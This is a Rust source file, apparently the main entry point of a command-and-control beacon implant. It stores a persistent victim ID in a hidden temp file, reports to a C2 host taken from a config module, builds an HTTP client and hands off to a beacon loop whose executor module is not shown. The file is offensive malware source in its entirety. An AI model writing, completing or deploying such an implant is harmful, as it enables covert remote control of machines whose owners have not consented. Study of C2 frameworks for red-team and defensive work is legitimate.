/// main.rs: beacon entry point.
/// generate UUID, builds HTTP client, start beacon loop

mod beacon;
mod config;
mod executor;

use std::fs;
use uuid::Uuid;

fn uuid_store_path() -> String {
    #[cfg(target_os = "windows")]
    {
        format!(
            "{}\\AppData\\Local\\Temp\\.beacon_id",
            std::env::var("USERPROFILE").unwrap_or_else(|_| "C:\\Windows\\Temp".to_string())
        )
    }
    #[cfg(not(target_os = "windows"))]
    {
        "/tmp/.beacon_id".to_string()
    }
}

fn load_or_create_uuid() -> String {
    let path = uuid_store_path();
    if let Ok(id) = fs::read_to_string(&path) {
        let id = id.trim().to_string();
        if !id.is_empty() {
            return id;
        }
    }
    let id = Uuid::new_v4().to_string();
    let _ = fs::write(&path, &id);
    id
}

fn main() {
    let beacon_uuid = load_or_create_uuid();
    eprintln!("[beacon] UUID: {beacon_uuid}");
    eprintln!("[beacon] C2:   {}", config::C2_HOST);

    let client = reqwest::blocking::Client::builder()
        .timeout(std::time::Duration::from_secs(15))
        .build()
        .expect("failed to build HTTP client");

    beacon::run(&beacon_uuid, &client);
}
